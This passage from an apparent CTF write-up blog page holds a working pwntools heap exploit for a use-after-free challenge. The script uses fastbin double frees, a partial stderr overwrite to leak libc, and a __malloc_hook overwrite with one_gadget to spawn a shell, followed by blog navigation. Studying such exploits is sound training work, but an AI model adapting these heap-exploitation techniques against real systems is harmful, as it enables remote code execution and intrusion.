io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;2.del&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;2.del&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line"></span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x50</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x31</span>)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x60</span>, p) <span class="comment"># idx 1</span></span><br><span class="line">	ad(<span class="number">0x80</span>, <span class="string">&#x27;B&#x27;</span>) <span class="comment"># idx 2</span></span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 3</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 4</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># for fastbin attack to _free_hook</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 5</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># idx 6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	rm(<span class="number">3</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">2</span>) <span class="comment"># for patial write to </span></span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;\x90&#x27;</span>) <span class="comment"># attack to chunk 2 - 0x10</span></span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	p = p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x71</span>)</span><br><span class="line">	p += <span class="string">&#x27;\xdd\x25&#x27;</span></span><br><span class="line">	ad(<span class="number">0x20</span>, p) <span class="comment"># patial write to _IO_2_1_stderr_ + 157</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment"># fastbin attack to _IO__2_1_stderr + 157</span></span><br><span class="line">	rm(<span class="number">4</span>)</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	rm(<span class="number">4</span>)</span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;\xa0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># for alignment</span></span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x33</span></span><br><span class="line">	p += p64(<span class="number">0xfbad3c80</span>)</span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">	p += p8(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x60</span>, p)</span><br><span class="line">	lib.address = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - (<span class="number">0x7ffff7dd2608</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> + <span class="built_in">hex</span>(lib.address))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># fast bin attack to malloc_hook - 0x23</span></span><br><span class="line">	rm(<span class="number">5</span>)	</span><br><span class="line">	rm(<span class="number">6</span>)	</span><br><span class="line">	rm(<span class="number">5</span>)	</span><br><span class="line"></span><br><span class="line">	p = p64(lib.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>)</span><br><span class="line">	ad(<span class="number">0x68</span>, p)</span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># for ajust</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># for ajust</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">	one_gadget = lib.address + gadget[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">	p = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x13</span> <span class="number">-8</span>)</span><br><span class="line">	p += p64(one_gadget)</span><br><span class="line">	p += p64(lib.sym[<span class="string">&#x27;realloc&#x27;</span>] + <span class="number">12</span>)</span><br><span class="line">	ad(<span class="number">0x68</span>, p)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># get shell</span></span><br><span class="line">	ru(<span class="string">&#x27;del&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">	</span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">[rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.i0gan.cn/2020/05/06/wp-uaf/" data-id="ckhemv83c003qwdcm8p3r7wq2" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/05/12/install-docker-on-debian/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          install-docker-on-debian
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/05/01/wp-house-of-orange/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">wp house of orange</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/dev/">dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vul/">vul</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vul/" rel="tag">vul</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/android/" style="font-size: 12.5px;">android</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/dev/" style="font-size: 10px;">dev</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/golang/" style="font-size: 10px;">golang</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/kernel/" style="font-size: 12.5px;">kernel</a> <a href="/tags/life/" style="font-size: 15px;">life</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/pwn-env/" style="font-size: 10px;">pwn-env</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/vul/" style="font-size: 10px;">vul</a> <a href="/tags/weekly-summary/" style="font-size: 12.5px;">weekly summary</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/08/wp-other/">wp-thb-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
+          </li>
+        
+          <li>
+            <a href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 i0gan<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
